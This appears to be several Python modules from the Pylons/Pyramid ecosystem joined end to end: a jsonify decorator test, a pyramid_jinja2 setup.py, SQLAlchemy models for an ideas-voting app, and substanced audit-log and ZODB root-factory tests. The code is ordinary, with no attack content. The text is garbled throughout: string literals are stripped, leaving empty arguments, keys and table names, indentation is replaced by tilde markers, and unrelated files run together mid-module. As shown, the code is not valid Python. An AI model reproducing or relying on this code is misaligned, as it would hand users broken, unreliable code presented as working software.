~~~ """Return the `pylons` object: either the :mod`~pylons` module or\n    the :attr:`~WSGIController._py_object` equivalent, searching a\n    decorator\'s *args for the latter\n\n    :attr:`~WSGIController._py_object` is more efficient as it provides\n    direct access to the Pylons global variables.\n    """ \n 
if decorator_args : \n 
~~~ controller = decorator_args [ 0 ] \n 
if isinstance ( controller , WSGIController ) : \n 
~~~ return controller . _py_object \n 
~~ ~~ return pylons \n 
~~ import warnings \n 
\n 
from paste . fixture import TestApp \n 
from paste . registry import RegistryManager \n 
\n 
from __init__ import TestWSGIController \n 
\n 
def make_cache_controller_app ( ) : \n 
~~~ from pylons . testutil import ControllerWrap , SetupCacheGlobal \n 
from pylons . decorators import jsonify \n 
from pylons . controllers import WSGIController \n 
\n 
class CacheController ( WSGIController ) : \n 
\n 
~~~ @ jsonify \n 
def test_bad_json ( self ) : \n 
~~~ return [ "this is neat" ] \n 
\n 
~~ @ jsonify \n 
def test_bad_json2 ( self ) : \n 
~~~ return ( "this is neat" , ) \n 
\n 
~~ @ jsonify \n 
def test_good_json ( self ) : \n 
~~~ return dict ( fred = 42 ) \n 
\n 
~~ ~~ environ = { } \n 
app = ControllerWrap ( CacheController ) \n 
app = sap = SetupCacheGlobal ( app , environ ) \n 
app = RegistryManager ( app ) \n 
app = TestApp ( app ) \n 
return app , environ \n 
\n 
\n 
~~ class TestJsonifyDecorator ( TestWSGIController ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . app , environ = make_cache_controller_app ( ) \n 
TestWSGIController . setUp ( self ) \n 
environ . update ( self . environ ) \n 
warnings . simplefilter ( , Warning ) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ warnings . simplefilter ( , Warning ) \n 
\n 
~~ def test_bad_json ( self ) : \n 
~~~ for action in , : \n 
~~~ try : \n 
~~~ response = self . get_response ( action = action ) \n 
~~ except Warning , msg : \n 
~~~ assert in msg [ 0 ] \n 
\n 
~~ ~~ ~~ def test_good_json ( self ) : \n 
~~~ response = self . get_response ( action = ) \n 
assert \'{"fred": 42}\' in response \n 
assert response . header ( ) == \n 
~~ ~~ """Helper functions\n\nConsists of functions to typically be used within templates, but also\navailable to Controllers. This module is available to both as \'h\'.\n""" \n 
############################################################################## \n 
# \n 
# Copyright (c) 2010 Agendaless Consulting and Contributors. \n 
# All Rights Reserved. \n 
# \n 
# This software is subject to the provisions of the BSD-like license at \n 
# http://www.repoze.org/LICENSE.txt.  A copy of the license should accompany \n 
# this distribution.  THIS SOFTWARE IS PROVIDED "AS IS" AND ANY AND ALL \n 
# EXPRESS OR IMPLIED WARRANTIES ARE DISCLAIMED, INCLUDING, BUT NOT LIMITED TO, \n 
# THE IMPLIED WARRANTIES OF TITLE, MERCHANTABILITY, AGAINST INFRINGEMENT, AND \n 
# FITNESS FOR A PARTICULAR PURPOSE \n 
# \n 
############################################################################## \n 
\n 
import os \n 
import sys \n 
\n 
from setuptools import setup , find_packages \n 
\n 
here = os . path . abspath ( os . path . dirname ( __file__ ) ) \n 
if sys . version_info [ 0 ] > 2 : \n 
~~~ README = open ( os . path . join ( here , ) , encoding = "utf-8" ) . read ( ) \n 
CHANGES = open ( os . path . join ( here , ) , encoding = "utf-8" ) . read ( ) \n 
~~ else : \n 
~~~ README = open ( os . path . join ( here , ) ) . read ( ) \n 
CHANGES = open ( os . path . join ( here , ) ) . read ( ) \n 
\n 
~~ requires = [ \n 
, # pyramid.path.DottedNameResolver \n 
, \n 
] \n 
\n 
if ( 3 , ) < sys . version_info < ( 3 , 3 ) : \n 
~~~ requires . extend ( [ \n 
, #2.7 drops Python 3.2 compat. \n 
, #0.16 drops Python 3.2 compat \n 
] ) \n 
~~ else : \n 
~~~ requires . extend ( [ \n 
, \n 
, \n 
] ) \n 
\n 
~~ try : \n 
~~~ import wsgiref \n 
~~ except ImportError : \n 
~~~ requires . append ( ) \n 
\n 
~~ testing_extras = [ , , ] \n 
docs_extras = [ , ] \n 
\n 
setup ( name = , \n 
version = , \n 
description = , \n 
long_description = README + + CHANGES , \n 
classifiers = [ \n 
"Intended Audience :: Developers" , \n 
"Programming Language :: Python :: Implementation :: CPython" , \n 
"Programming Language :: Python :: Implementation :: PyPy" , \n 
"Programming Language :: Python" , \n 
"Programming Language :: Python :: 2" , \n 
"Programming Language :: Python :: 2.6" , \n 
"Programming Language :: Python :: 2.7" , \n 
"Programming Language :: Python :: 3" , \n 
"Programming Language :: Python :: 3.3" , \n 
"Programming Language :: Python :: 3.4" , \n 
"Programming Language :: Python :: 3.5" , \n 
"Framework :: Pyramid" , \n 
"License :: Repoze Public License" , \n 
] , \n 
keywords = , \n 
author = "Rocky Burt" , \n 
author_email = "pylons-discuss@googlegroups.com" , \n 
maintainer = "Domen Kozar" , \n 
maintainer_email = "domen@dev.si" , \n 
url = "https://github.com/Pylons/pyramid_jinja2" , \n 
license = "BSD-derived (http://www.repoze.org/LICENSE.txt)" , \n 
packages = find_packages ( ) , \n 
include_package_data = True , \n 
zip_safe = False , \n 
install_requires = requires , \n 
extras_require = { \n 
: testing_extras , \n 
: docs_extras , \n 
} , \n 
tests_require = requires + [ ] , \n 
test_suite = "pyramid_jinja2.tests" , \n 
entry_points = """\n        [paste.paster_create_template]\n        pyramid_jinja2_starter=pyramid_jinja2.scaffolds:Jinja2ProjectTemplate\n        [pyramid.scaffold]\n        pyramid_jinja2_starter=pyramid_jinja2.scaffolds:Jinja2ProjectTemplate\n      """ , \n 
) \n 
import cryptacular . bcrypt \n 
\n 
from sqlalchemy import ( \n 
Table , \n 
Column , \n 
ForeignKey , \n 
) \n 
\n 
from sqlalchemy . orm import ( \n 
scoped_session , \n 
sessionmaker , \n 
relation , \n 
backref , \n 
column_property , \n 
synonym , \n 
joinedload , \n 
) \n 
\n 
from sqlalchemy . types import ( \n 
Integer , \n 
Unicode , \n 
UnicodeText , \n 
) \n 
\n 
from sqlalchemy . sql import func \n 
from sqlalchemy . ext . declarative import declarative_base \n 
\n 
from zope . sqlalchemy import ZopeTransactionExtension \n 
\n 
from pyramid . security import ( \n 
Everyone , \n 
Authenticated , \n 
Allow , \n 
) \n 
\n 
DBSession = scoped_session ( sessionmaker ( extension = ZopeTransactionExtension ( ) ) ) \n 
Base = declarative_base ( ) \n 
\n 
crypt = cryptacular . bcrypt . BCRYPTPasswordManager ( ) \n 
\n 
def hash_password ( password ) : \n 
~~~ return unicode ( crypt . encode ( password ) ) \n 
\n 
\n 
~~ class User ( Base ) : \n 
~~~ """\n    Application\'s user model.\n    """ \n 
__tablename__ = \n 
user_id = Column ( Integer , primary_key = True ) \n 
username = Column ( Unicode ( 20 ) , unique = True ) \n 
name = Column ( Unicode ( 50 ) ) \n 
email = Column ( Unicode ( 50 ) ) \n 
hits = Column ( Integer , default = 0 ) \n 
misses = Column ( Integer , default = 0 ) \n 
delivered_hits = Column ( Integer , default = 0 ) \n 
delivered_misses = Column ( Integer , default = 0 ) \n 
\n 
_password = Column ( , Unicode ( 60 ) ) \n 
\n 
def _get_password ( self ) : \n 
~~~ return self . _password \n 
\n 
~~ def _set_password ( self , password ) : \n 
~~~ self . _password = hash_password ( password ) \n 
\n 
~~ password = property ( _get_password , _set_password ) \n 
password = synonym ( , descriptor = password ) \n 
\n 
def __init__ ( self , username , password , name , email ) : \n 
~~~ self . username = username \n 
self . name = name \n 
self . email = email \n 
self . password = password \n 
\n 
~~ @ classmethod \n 
def get_by_username ( cls , username ) : \n 
~~~ return DBSession . query ( cls ) . filter ( cls . username == username ) . first ( ) \n 
\n 
~~ @ classmethod \n 
def check_password ( cls , username , password ) : \n 
~~~ user = cls . get_by_username ( username ) \n 
if not user : \n 
~~~ return False \n 
~~ return crypt . check ( user . password , password ) \n 
\n 
\n 
~~ ~~ ideas_tags = Table ( , Base . metadata , \n 
Column ( , Integer , ForeignKey ( ) ) , \n 
Column ( , Integer , ForeignKey ( ) ) \n 
) \n 
\n 
\n 
class Tag ( Base ) : \n 
~~~ """\n    Idea\'s tag model.\n    """ \n 
__tablename__ = \n 
tag_id = Column ( Integer , primary_key = True ) \n 
name = Column ( Unicode ( 50 ) , unique = True , index = True ) \n 
\n 
def __init__ ( self , name ) : \n 
~~~ self . name = name \n 
\n 
~~ @ staticmethod \n 
def extract_tags ( tags_string ) : \n 
~~~ tags = tags_string . replace ( , ) . replace ( , ) \n 
tags = [ tag . lower ( ) for tag in tags . split ( ) ] \n 
tags = set ( tags ) \n 
\n 
return tags \n 
\n 
~~ @ classmethod \n 
def get_by_name ( cls , tag_name ) : \n 
~~~ tag = DBSession . query ( cls ) . filter ( cls . name == tag_name ) \n 
return tag . first ( ) \n 
\n 
~~ @ classmethod \n 
def create_tags ( cls , tags_string ) : \n 
~~~ tags_list = cls . extract_tags ( tags_string ) \n 
tags = [ ] \n 
\n 
for tag_name in tags_list : \n 
~~~ tag = cls . get_by_name ( tag_name ) \n 
if not tag : \n 
~~~ tag = Tag ( name = tag_name ) \n 
DBSession . add ( tag ) \n 
~~ tags . append ( tag ) \n 
\n 
~~ return tags \n 
\n 
~~ @ classmethod \n 
def tag_counts ( cls ) : \n 
~~~ query = DBSession . query ( Tag . name , func . count ( ) ) \n 
return query . join ( ) . group_by ( Tag . name ) \n 
\n 
~~ ~~ voted_users = Table ( , Base . metadata , \n 
Column ( , Integer , ForeignKey ( ) ) , \n 
Column ( , Integer , ForeignKey ( ) ) \n 
) \n 
\n 
\n 
class Idea ( Base ) : \n 
~~~ __tablename__ = \n 
idea_id = Column ( Integer , primary_key = True ) \n 
target_id = Column ( Integer , ForeignKey ( ) ) \n 
comments = relation ( , cascade = "delete" , \n 
backref = backref ( , remote_side = idea_id ) ) \n 
author_id = Column ( Integer , ForeignKey ( ) ) \n 
author = relation ( User , cascade = "delete" , backref = ) \n 
title = Column ( UnicodeText ) \n 
text = Column ( UnicodeText ) \n 
hits = Column ( Integer , default = 0 ) \n 
misses = Column ( Integer , default = 0 ) \n 
tags = relation ( Tag , secondary = ideas_tags , backref = ) \n 
voted_users = relation ( User , secondary = voted_users , lazy = , \n 
backref = ) \n 
hit_percentage = func . coalesce ( hits / ( hits + misses ) * 100 , 0 ) \n 
\n 
hit_percentage = column_property ( hit_percentage . label ( ) ) \n 
\n 
total_votes = column_property ( ( hits + misses ) . label ( ) ) \n 
\n 
vote_differential = column_property ( \n 
( hits - misses ) . label ( ) \n 
) \n 
\n 
@ classmethod \n 
def get_query ( cls , with_joinedload = True ) : \n 
~~~ query = DBSession . query ( cls ) \n 
if with_joinedload : \n 
~~~ query = query . options ( joinedload ( ) , joinedload ( ) ) \n 
~~ return query \n 
\n 
~~ @ classmethod \n 
def get_by_id ( cls , idea_id , with_joinedload = True ) : \n 
~~~ query = cls . get_query ( with_joinedload ) \n 
return query . filter ( cls . idea_id == idea_id ) . first ( ) \n 
\n 
~~ @ classmethod \n 
def get_by_tagname ( cls , tag_name , with_joinedload = True ) : \n 
~~~ query = cls . get_query ( with_joinedload ) \n 
return query . filter ( Idea . tags . any ( name = tag_name ) ) \n 
\n 
~~ @ classmethod \n 
def ideas_bunch ( cls , order_by , how_many = 10 , with_joinedload = True ) : \n 
~~~ query = cls . get_query ( with_joinedload ) . join ( ) \n 
query = query . filter ( cls . target == None ) . order_by ( order_by ) \n 
return query . limit ( how_many ) . all ( ) \n 
\n 
~~ def user_voted ( self , username ) : \n 
~~~ return bool ( self . voted_users . filter_by ( username = username ) . first ( ) ) \n 
\n 
~~ def vote ( self , user , positive ) : \n 
~~~ if positive : \n 
~~~ self . hits += 1 \n 
self . author . hits += 1 \n 
user . delivered_hits += 1 \n 
~~ else : \n 
~~~ self . misses += 1 \n 
self . author . misses += 1 \n 
user . delivered_misses += 1 \n 
\n 
~~ self . voted_users . append ( user ) \n 
\n 
\n 
~~ ~~ class RootFactory ( object ) : \n 
~~~ __acl__ = [ \n 
( Allow , Everyone , ) , \n 
( Allow , Authenticated , ) \n 
] \n 
\n 
def __init__ ( self , request ) : \n 
~~~ pass # pragma: no cover \n 
\n 
~~ ~~ import json \n 
import unittest \n 
from pyramid import testing \n 
import mock \n 
\n 
class Test_acl_modified ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . request = testing . DummyRequest ( ) \n 
self . config = testing . setUp ( request = self . request ) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ testing . tearDown ( ) \n 
\n 
~~ def _callFUT ( self , event ) : \n 
~~~ from . . subscribers import acl_modified \n 
return acl_modified ( event ) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it ( self , mock_get_auditlog ) : \n 
~~~ from substanced . audit import AuditLog \n 
self . request . user = Dummy ( { : 1 , : } ) \n 
event = Dummy ( ) \n 
context = testing . DummyResource ( ) \n 
auditlog = AuditLog ( ) \n 
mock_get_auditlog . side_effect = lambda c : auditlog \n 
context . __oid__ = 5 \n 
event . registry = _makeRegistry ( ) \n 
event . object = context \n 
event . old_acl = \n 
event . new_acl = \n 
self . _callFUT ( event ) \n 
self . assertEqual ( len ( auditlog ) , 1 ) \n 
entries = list ( auditlog . entries ) \n 
entry = entries [ 0 ] \n 
self . assertEqual ( entry [ 0 ] , 0 ) \n 
self . assertEqual ( entry [ 1 ] , 0 ) \n 
self . assertEqual ( entry [ 2 ] . name , ) \n 
self . assertEqual ( entry [ 2 ] . oid , 5 ) \n 
self . assertEqual ( \n 
json . loads ( entry [ 2 ] . payload ) , \n 
{ \n 
: entry [ 2 ] . timestamp , \n 
: , \n 
: , \n 
: { : 1 , : } , \n 
: , \n 
: \n 
} \n 
\n 
) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it_nolog ( self , mock_get_auditlog ) : \n 
~~~ mock_get_auditlog . side_effect = lambda c : None \n 
event = Dummy ( ) \n 
context = testing . DummyResource ( ) \n 
context . __oid__ = 5 \n 
event . object = context \n 
self . assertEqual ( self . _callFUT ( event ) , None ) \n 
\n 
~~ ~~ _marker = object ( ) \n 
\n 
class Test_content_added_moved_or_duplicated ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . request = testing . DummyRequest ( ) \n 
self . config = testing . setUp ( request = self . request ) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ testing . tearDown ( ) \n 
\n 
~~ def _callFUT ( self , event ) : \n 
~~~ from . . subscribers import content_added_moved_or_duplicated \n 
return content_added_moved_or_duplicated ( event ) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it_added ( self , mock_get_auditlog ) : \n 
~~~ auditlog = _makeAuditLog ( ) \n 
mock_get_auditlog . side_effect = lambda c : auditlog \n 
self . request . user = Dummy ( { : 1 , : } ) \n 
event = _makeEvent ( ) \n 
self . _callFUT ( event ) \n 
self . assertEqual ( len ( auditlog ) , 1 ) \n 
entries = list ( auditlog . entries ) \n 
entry = entries [ 0 ] \n 
self . assertEqual ( entry [ 0 ] , 0 ) \n 
self . assertEqual ( entry [ 1 ] , 0 ) \n 
self . assertEqual ( entry [ 2 ] . name , ) \n 
self . assertEqual ( entry [ 2 ] . oid , 10 ) \n 
self . assertEqual ( \n 
json . loads ( entry [ 2 ] . payload ) , \n 
{ \n 
: , \n 
: 10 , \n 
: , \n 
: { : 1 , : } , \n 
: , \n 
: entry [ 2 ] . timestamp , \n 
: 5 \n 
\n 
} \n 
) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it_added_noscribe ( self , mock_get_auditlog ) : \n 
~~~ mock_get_auditlog . side_effect = lambda c : None \n 
event = _makeEvent ( ) \n 
self . _callFUT ( event ) # does not throw an exception \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it_moved ( self , mock_get_auditlog ) : \n 
~~~ auditlog = _makeAuditLog ( ) \n 
mock_get_auditlog . side_effect = lambda c : auditlog \n 
self . request . user = Dummy ( { : 1 , : } ) \n 
event = _makeEvent ( ) \n 
event . moving = True \n 
event . duplicating = None \n 
self . _callFUT ( event ) \n 
self . assertEqual ( len ( auditlog ) , 1 ) \n 
entries = list ( auditlog . entries ) \n 
entry = entries [ 0 ] \n 
self . assertEqual ( entry [ 0 ] , 0 ) \n 
self . assertEqual ( entry [ 1 ] , 0 ) \n 
self . assertEqual ( entry [ 2 ] . name , ) \n 
self . assertEqual ( entry [ 2 ] . oid , 10 ) \n 
self . assertEqual ( \n 
json . loads ( entry [ 2 ] . payload ) , \n 
{ \n 
: , \n 
: 10 , \n 
: , \n 
: { : 1 , : } , \n 
: , \n 
: entry [ 2 ] . timestamp , \n 
: 5 \n 
\n 
} \n 
) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it_duplicated ( self , mock_get_auditlog ) : \n 
~~~ auditlog = _makeAuditLog ( ) \n 
mock_get_auditlog . side_effect = lambda c : auditlog \n 
self . request . user = Dummy ( { : 1 , : } ) \n 
event = _makeEvent ( ) \n 
event . moving = None \n 
event . duplicating = True \n 
self . _callFUT ( event ) \n 
self . assertEqual ( len ( auditlog ) , 1 ) \n 
entries = list ( auditlog . entries ) \n 
entry = entries [ 0 ] \n 
self . assertEqual ( entry [ 0 ] , 0 ) \n 
self . assertEqual ( entry [ 1 ] , 0 ) \n 
self . assertEqual ( entry [ 2 ] . name , ) \n 
self . assertEqual ( entry [ 2 ] . oid , 10 ) \n 
self . assertEqual ( \n 
json . loads ( entry [ 2 ] . payload ) , \n 
{ \n 
: , \n 
: 10 , \n 
: , \n 
: { : 1 , : } , \n 
: , \n 
: entry [ 2 ] . timestamp , \n 
: 5 \n 
\n 
} \n 
) \n 
\n 
~~ ~~ class Test_content_removed ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . request = testing . DummyRequest ( ) \n 
self . config = testing . setUp ( request = self . request ) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ testing . tearDown ( ) \n 
\n 
~~ def _callFUT ( self , event ) : \n 
~~~ from . . subscribers import content_removed \n 
return content_removed ( event ) \n 
\n 
~~ def test_it_moving ( self ) : \n 
~~~ event = Dummy ( ) \n 
event . moving = True \n 
self . assertEqual ( self . _callFUT ( event ) , None ) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it ( self , mock_get_auditlog ) : \n 
~~~ auditlog = _makeAuditLog ( ) \n 
mock_get_auditlog . side_effect = lambda c : auditlog \n 
self . request . user = Dummy ( { : 1 , : } ) \n 
event = _makeEvent ( ) \n 
event . moving = None \n 
event . duplicating = None \n 
self . _callFUT ( event ) \n 
self . assertEqual ( len ( auditlog ) , 1 ) \n 
entries = list ( auditlog . entries ) \n 
entry = entries [ 0 ] \n 
self . assertEqual ( entry [ 0 ] , 0 ) \n 
self . assertEqual ( entry [ 1 ] , 0 ) \n 
self . assertEqual ( entry [ 2 ] . name , ) \n 
self . assertEqual ( entry [ 2 ] . oid , 10 ) \n 
self . assertEqual ( \n 
json . loads ( entry [ 2 ] . payload ) , \n 
{ \n 
: , \n 
: 10 , \n 
: , \n 
: { : 1 , : } , \n 
: , \n 
: entry [ 2 ] . timestamp , \n 
: 5 \n 
\n 
} \n 
) \n 
\n 
\n 
\n 
~~ ~~ class Test_content_modified ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . request = testing . DummyRequest ( ) \n 
self . config = testing . setUp ( request = self . request ) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ testing . tearDown ( ) \n 
\n 
~~ def _callFUT ( self , event ) : \n 
~~~ from . . subscribers import content_modified \n 
return content_modified ( event ) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it_noscribe ( self , mock_get_auditlog ) : \n 
~~~ mock_get_auditlog . side_effect = lambda c : None \n 
event = Dummy ( ) \n 
context = testing . DummyResource ( ) \n 
event . object = context \n 
self . assertEqual ( self . _callFUT ( event ) , None ) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it ( self , mock_get_auditlog ) : \n 
~~~ auditlog = _makeAuditLog ( ) \n 
mock_get_auditlog . side_effect = lambda c : auditlog \n 
self . request . user = Dummy ( { : 1 , : } ) \n 
event = Dummy ( ) \n 
context = testing . DummyResource ( ) \n 
context . __oid__ = 5 \n 
event . registry = _makeRegistry ( ) \n 
event . object = context \n 
self . _callFUT ( event ) \n 
self . assertEqual ( len ( auditlog ) , 1 ) \n 
entries = list ( auditlog . entries ) \n 
entry = entries [ 0 ] \n 
self . assertEqual ( entry [ 0 ] , 0 ) \n 
self . assertEqual ( entry [ 1 ] , 0 ) \n 
self . assertEqual ( entry [ 2 ] . name , ) \n 
self . assertEqual ( entry [ 2 ] . oid , 5 ) \n 
self . assertEqual ( \n 
json . loads ( entry [ 2 ] . payload ) , \n 
{ \n 
: 5 , \n 
: { : 1 , : } , \n 
: , \n 
: , \n 
: entry [ 2 ] . timestamp , \n 
} , \n 
) \n 
\n 
~~ ~~ class Test_logged_in ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . request = testing . DummyRequest ( ) \n 
self . config = testing . setUp ( request = self . request ) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ testing . tearDown ( ) \n 
\n 
~~ def _callFUT ( self , event ) : \n 
~~~ from . . subscribers import logged_in \n 
return logged_in ( event ) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it_noscribe ( self , mock_get_auditlog ) : \n 
~~~ mock_get_auditlog . side_effect = lambda c : None \n 
event = Dummy ( ) \n 
event . request = Dummy ( ) \n 
context = testing . DummyResource ( ) \n 
event . request . context = context \n 
self . assertEqual ( self . _callFUT ( event ) , None ) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it_user_has_oid ( self , mock_get_auditlog ) : \n 
~~~ auditlog = _makeAuditLog ( ) \n 
mock_get_auditlog . side_effect = lambda c : auditlog \n 
event = Dummy ( ) \n 
event . request = Dummy ( ) \n 
context = testing . DummyResource ( ) \n 
event . request . context = context \n 
user = Dummy ( ) \n 
user . __oid__ = 5 \n 
event . user = user \n 
event . login = \n 
self . _callFUT ( event ) \n 
self . assertEqual ( len ( auditlog ) , 1 ) \n 
entries = list ( auditlog . entries ) \n 
entry = entries [ 0 ] \n 
self . assertEqual ( entry [ 0 ] , 0 ) \n 
self . assertEqual ( entry [ 1 ] , 0 ) \n 
self . assertEqual ( entry [ 2 ] . name , ) \n 
self . assertEqual ( entry [ 2 ] . oid , None ) \n 
self . assertEqual ( \n 
json . loads ( entry [ 2 ] . payload ) , \n 
{ \n 
: 5 , \n 
: , \n 
: entry [ 2 ] . timestamp , \n 
} , \n 
) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it_user_has_no_oid ( self , mock_get_auditlog ) : \n 
~~~ auditlog = _makeAuditLog ( ) \n 
mock_get_auditlog . side_effect = lambda c : auditlog \n 
event = Dummy ( ) \n 
event . request = Dummy ( ) \n 
context = testing . DummyResource ( ) \n 
event . request . context = context \n 
user = Dummy ( ) \n 
event . user = user \n 
event . login = \n 
self . _callFUT ( event ) \n 
self . assertEqual ( len ( auditlog ) , 1 ) \n 
entries = list ( auditlog . entries ) \n 
entry = entries [ 0 ] \n 
self . assertEqual ( entry [ 0 ] , 0 ) \n 
self . assertEqual ( entry [ 1 ] , 0 ) \n 
self . assertEqual ( entry [ 2 ] . name , ) \n 
self . assertEqual ( entry [ 2 ] . oid , None ) \n 
self . assertEqual ( \n 
json . loads ( entry [ 2 ] . payload ) , \n 
{ \n 
: None , \n 
: , \n 
: entry [ 2 ] . timestamp , \n 
} , \n 
) \n 
\n 
~~ ~~ class Test_root_added ( unittest . TestCase ) : \n 
~~~ def _callFUT ( self , event ) : \n 
~~~ from . . subscribers import root_added \n 
return root_added ( event ) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it ( self , mock_set_auditlog ) : \n 
~~~ event = Dummy ( ) \n 
root = Dummy ( ) \n 
def is_set ( _root ) : \n 
~~~ self . assertEqual ( _root , root ) \n 
~~ mock_set_auditlog . side_effect = is_set \n 
event . object = root \n 
self . _callFUT ( event ) \n 
\n 
~~ ~~ class Dummy ( object ) : \n 
~~~ def __init__ ( self , kw = None ) : \n 
~~~ if kw : \n 
~~~ self . __dict__ . update ( kw ) \n 
\n 
~~ ~~ ~~ class DummyContentRegistry ( object ) : \n 
~~~ def typeof ( self , content ) : \n 
~~~ return \n 
\n 
~~ ~~ def _makeAuditLog ( ) : \n 
~~~ from substanced . audit import AuditLog \n 
auditlog = AuditLog ( ) \n 
return auditlog \n 
\n 
~~ def _makeRegistry ( ) : \n 
~~~ registry = Dummy ( ) \n 
registry . content = DummyContentRegistry ( ) \n 
return registry \n 
\n 
~~ def _makeEvent ( ) : \n 
~~~ event = Dummy ( ) \n 
event . moving = None \n 
event . duplicating = None \n 
event . parent = testing . DummyResource ( ) \n 
event . parent . __oid__ = 10 \n 
event . name = \n 
context = testing . DummyResource ( ) \n 
context . __oid__ = 5 \n 
context . __parent__ = event . parent \n 
event . registry = _makeRegistry ( ) \n 
event . object = context \n 
event . old_acl = \n 
event . new_acl = \n 
return event \n 
\n 
~~ import unittest \n 
from pyramid import testing \n 
\n 
class Test_root_factory ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . config = testing . setUp ( ) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ testing . tearDown ( ) \n 
\n 
~~ def _callFUT ( self , request , transaction , get_connection , evolve_packages ) : \n 
~~~ from . . import root_factory \n 
return root_factory ( request , transaction , get_connection , \n 
evolve_packages ) \n 
\n 
~~ def _makeRequest ( self , app_root = None ) : \n 
~~~ request = Dummy ( ) \n 
request . registry = DummyRegistry ( ) \n 
request . registry . content = Dummy ( ) \n 
request . registry . content . create = lambda * arg : app_root \n 
return request \n 
\n 
~~ def test_without_app_root ( self ) : \n 
~~~ txn = DummyTransaction ( ) \n 
root = { } \n 
gc = Dummy_get_connection ( root ) \n 
ep = DummyFunction ( True ) \n 
app_root = object ( ) \n 
request = self . _makeRequest ( app_root ) \n 
result = self . _callFUT ( request , txn , gc , ep ) \n 
self . assertEqual ( result , app_root ) \n 
self . assertTrue ( txn . committed ) \n 
self . assertTrue ( txn . savepointed ) \n 
self . assertTrue ( ep . called ) \n 
\n 
~~ def test_with_app_root ( self ) : \n 
~~~ txn = DummyTransaction ( ) \n 
app_root = object ( ) \n 
root = { : app_root } \n 
gc = Dummy_get_connection ( root ) \n 
ep = DummyFunction ( True ) \n 
request = testing . DummyRequest ( ) \n 
result = self . _callFUT ( request , txn , gc , ep ) \n 
self . assertEqual ( result , app_root ) \n 
self . assertFalse ( txn . committed ) \n 
\n 
~~ ~~ class Test_includeme ( unittest . TestCase ) : \n 
~~~ def test_it ( self ) : \n 
~~~ from . . import ( \n 
includeme , \n 
connection_opened , \n 
connection_will_close , \n 
ZODBConnectionOpened , \n 
ZODBConnectionWillClose , \n 
) \n 
config = DummyConfig ( ) \n 
includeme ( config ) \n 
self . assertEqual ( \n 
config . subscriptions , \n 
[ ( connection_opened , ZODBConnectionOpened ) , \n 
( connection_will_close , ZODBConnectionWillClose ) , \n 
] \n 
) \n 
\n 
~~ ~~ class Test_connection_opened ( unittest . TestCase ) : \n 
~~~ def test_it ( self ) : \n 
~~~ from . . import connection_opened \n 
event = DummyEvent ( ) \n 
connection_opened ( event ) \n 
self . assertEqual ( event . request . _zodb_tx_counts , ( 0 , 0 ) ) \n 
\n 
~~ ~~ class Test_connection_will_close ( unittest . TestCase ) : \n 
~~~ def _callFUT ( self , event , statsd_incr ) : \n 
~~~ from . . import connection_will_close \n 
return connection_will_close ( event , statsd_incr ) \n 
\n 
~~ def test_no_tx_counts ( self ) : \n 
~~~ event = DummyEvent ( ) \n 
result = self . _callFUT ( event , None ) \n 
self . assertEqual ( result , None ) # doesnt fail \n 
\n 
~~ def test_with_postitive_tx_counts ( self ) : \n 
~~~ event = DummyEvent ( 5 , 5 ) \n 
event . request . _zodb_tx_counts = ( 1 , 1 ) \n 
L = [ ] \n 
def statsd_incr ( name , num , registry = None ) : \n 
~~~ L . append ( ( name , num ) ) \n 
~~ self . _callFUT ( event , statsd_incr ) \n 
self . assertEqual ( \n 
L , \n 
[ ( , 4 ) , ( , 4 ) ] \n 
) \n 
\n 
~~ def test_with_zero_tx_counts ( self ) : \n 
~~~ event = DummyEvent ( 1 , 1 ) \n 
event . request . _zodb_tx_counts = ( 1 , 1 ) \n 
L = [ ] \n 
self . _callFUT ( event , None ) \n 
self . assertEqual ( \n 
L , \n 
[ ] \n 
) \n 
\n 
~~ ~~ class DummyTransaction ( object ) : \n 
~~~ committed = False \n 
savepointed = False \n 
def commit ( self ) : \n 
~~~ self . committed = True \n 
\n 
~~ def savepoint ( self ) : \n 
~~~ self . savepointed = True \n 
\n 
~~ ~~ class Dummy_get_connection ( object ) : \n 
~~~ def __init__ ( self , root ) : \n 
~~~ self . _root = root \n 
\n 
~~ def root ( self ) : \n 
~~~ return self . _root \n 
\n 
~~ def __call__ ( self , request ) : \n 
~~~ return self \n 
\n 
~~ ~~ class DummyFunction ( object ) : \n 
~~~ called = False \n 
def __init__ ( self , result ) : \n 
~~~ self . result = result \n 
~~ def __call__ ( self , * args , ** kw ) : \n 
~~~ self . called = True \n 
self . args = args \n 
self . kw = kw \n 
return self . result \n 
\n 
~~ ~~ class Dummy ( object ) : \n 
~~~ pass \n 
\n 
~~ class DummyRegistry ( object ) : \n 
~~~ def notify ( self , event ) : \n 
~~~ self . event = event \n 
\n 
~~ ~~ class DummyConfig ( object ) : \n 
~~~ def __init__ ( self ) : \n 
~~~ self . subscriptions = [ ] \n 
~~ def add_subscriber ( self , fn , event_type ) : \n 
~~~ self . subscriptions . append ( ( fn , event_type ) ) \n 
\n 
~~ ~~ class DummyConnection ( object ) : \n 
~~~ def __init__ ( self , loads , stores ) : \n 
~~~ self . loads = loads \n 
self . stores = stores \n 
\n 
~~ def getTransferCounts ( self ) : \n 
~~~ return ( self . loads , self . stores ) \n 
